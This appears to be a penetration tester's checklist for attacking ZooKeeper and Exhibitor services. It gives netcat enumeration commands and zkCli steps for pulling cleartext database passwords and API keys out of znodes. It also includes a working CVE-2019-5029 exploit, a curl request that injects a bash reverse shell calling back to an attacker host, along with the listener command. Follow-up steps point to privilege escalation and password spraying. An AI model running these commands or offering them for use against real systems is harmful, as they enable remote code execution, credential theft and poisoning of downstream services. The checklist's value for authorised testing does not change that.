# ZooKeeper / Exhibitor

## Before I start
- [ ] 2181 (ZooKeeper) and/or 8080 (Exhibitor) open

## ZooKeeper: four-letter words
echo envi | nc <TargetIP> 2181
echo stat | nc <TargetIP> 2181
echo conf | nc <TargetIP> 2181
echo dump | nc <TargetIP> 2181
- [ ] envi = version/host/paths; imok from ruok = alive
- [ ] No auth by default — this is normal, not a finding by itself

## Read the znodes
zkCli.sh -server <TargetIP>:2181
ls /
get /config/app
- [ ] App configs in znodes = DB passwords, API keys, cleartext
- [ ] No ACLs = write too → poison downstream services

## Exhibitor (8080) → CVE-2019-5029 RCE
curl -s http://target:8080/exhibitor/v1/config/get-state | jq
curl -X POST http://target:8080/exhibitor/v1/config/set -H 'Content-Type: application/json' -d '{"javaEnvironment":"$(/bin/bash -c \"bash -i >& /dev/tcp/<AttackerIP>/443 0>&1\" &)"}'
- [ ] java.env gets the $() executed on config rollout/restart
nc -lvnp 443
- [ ] ≤1.7.1 for the CVE; newer still gives unauth config read = znode loot

## If it fails
- [ ] 2181 refuses four-letter words → whitelisted commands only; zkCli still worth a shot
- [ ] Exhibitor authed → loot znode creds first, they often unlock it

## Next
- [ ] Shell as exhibitor/zookeeper → :Pb linux-enum, :Pb sudo
- [ ] App creds from znodes → :Pb spraying
